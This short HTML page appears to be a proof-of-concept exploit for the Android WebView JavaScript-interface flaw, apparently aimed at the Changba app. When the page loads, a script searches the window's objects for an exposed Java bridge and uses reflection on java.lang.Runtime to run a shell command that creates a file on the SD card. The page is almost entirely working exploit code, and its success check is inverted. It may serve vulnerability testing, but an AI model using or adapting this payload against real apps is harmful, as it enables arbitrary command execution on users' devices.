<title>hello changba</title>

<script type="text/javascript">

function check()
{

	var res = 0;

	for (var obj in window) 
	{
		try {
			if ("getClass" in window[obj]) {
				try{
          var res = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/system/bin/sh", "-c", "touch /mnt/sdcard/created_by_changba"]);
         <!-- document.write(getContents(res.getInputStream())); -->
       
					
					break;
				}catch(e){
				}	
			}
		} catch(e) {
		}
	}

	if(res==0)
	{
	  document.write("exec success!");
	} else
	{
	document.write("exec failed!");	
	}
}
</script>
</head>
<body onload="check();">
</body>
